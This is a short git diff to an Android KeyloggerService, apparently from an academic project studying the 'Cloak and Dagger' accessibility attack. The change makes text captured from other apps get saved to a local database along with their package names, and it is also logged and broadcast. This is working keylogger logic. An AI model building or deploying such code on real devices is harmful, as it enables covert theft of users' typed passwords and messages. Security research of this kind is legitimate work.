@@ -11,18 +11,17 @@ import android.view.accessibility.AccessibilityEvent;
 import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_NAME;
 import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_VALUE;
 import static pl.edu.agh.sarna.cloak_and_dagger.Constants.LOG_TAG;
+import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.getLastCloakRunID;
+import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.insertCloakText;
 
 public class KeyloggerService extends AccessibilityService {
 
-    private KeyloggerBuffer buffer = new KeyloggerBuffer(new KeyloggerBuffer.OnSaveHandler() {
-        @Override
-        public void onSave(String text, String packageName) {
-            // TODO Add saving to database
-            String displayText = String.format("Saved text \"%s\" from %s", text, packageName);
-            Log.d(LOG_TAG, displayText);
-            LocalBroadcastManager.getInstance(KeyloggerService.this)
-                    .sendBroadcast(new Intent(INTENT_NAME).putExtra(INTENT_VALUE, displayText));
-        }
+    private KeyloggerBuffer buffer = new KeyloggerBuffer((text, packageName) -> {
+        insertCloakText(getApplicationContext(), getLastCloakRunID(getApplicationContext()), text, packageName);
+        String displayText = String.format("Saved text \"%s\" from %s", text, packageName);
+        Log.d(LOG_TAG, displayText);
+        LocalBroadcastManager.getInstance(KeyloggerService.this)
+                .sendBroadcast(new Intent(INTENT_NAME).putExtra(INTENT_VALUE, displayText));
     });
 
     public static boolean isRunning(Context context) {
